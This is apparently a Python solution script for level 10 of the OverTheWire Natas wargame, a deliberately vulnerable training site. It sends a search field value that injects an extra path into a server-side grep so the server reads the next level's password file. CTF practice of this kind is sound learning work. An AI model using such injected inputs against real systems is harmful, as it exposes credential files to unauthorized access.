import requests
import re

userName = 'natas10'
url = f'http://{userName}.natas.labs.overthewire.org/'
fileContent = open('C:\\Users\\niroj\\Documents\\Natas\\password.txt')
password = fileContent.readlines()[9][8:40]
# print(password)

response = requests.get(url, auth = (userName, password))
htmlDoc = response.text
# print(htmlDoc)

response = requests.get(url + 'index-source.html', auth = (userName, password))
htmlDoc = response.text
# print(htmlDoc)

data = {
    'needle': 'a /etc/natas_webpass/natas11',
    'submit': 'Search'
}

response = requests.post(url, auth = (userName, password), data = data)
htmlDoc = response.text

print(re.findall("natas(.*)", htmlDoc))

try:
    with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index.html', 'w') as htmlContent:
        htmlContent.writelines(htmlDoc)
        print("Operation successfully accomplished!")
except IOError as e:
    print(f"error {e} appear")